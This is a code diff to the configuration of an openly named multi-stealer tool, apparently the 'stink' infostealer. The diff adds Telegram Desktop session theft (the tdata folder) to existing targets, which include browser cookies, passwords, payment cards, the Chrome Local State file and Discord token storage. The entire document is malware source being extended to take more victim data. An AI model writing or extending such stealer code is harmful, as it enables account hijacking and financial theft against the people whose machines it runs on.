@@ -23,7 +23,7 @@ class MultistealerConfig:
     StoragePath: str = rf"{environ['USERPROFILE']}\AppData"
     StorageFolder: str = "stink"
 
-    Functions: tuple = ("system", "screen", "cookies", "passwords", "processes", "cards", "discord")
+    Functions: tuple = ("system", "screen", "cookies", "passwords", "processes", "cards", "discord", "telegram")
 
     ChromePaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
@@ -79,4 +79,11 @@ class AutostartConfig:
 class DiscordConfig:
 
     TokensPath: str = rf"C:\Users\{user}\AppData\Roaming\Discord\Local Storage\leveldb"
+    Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
+
+
+@dataclass
+class TelegramConfig:
+
+    SessionsPath: str = rf"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"
     Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
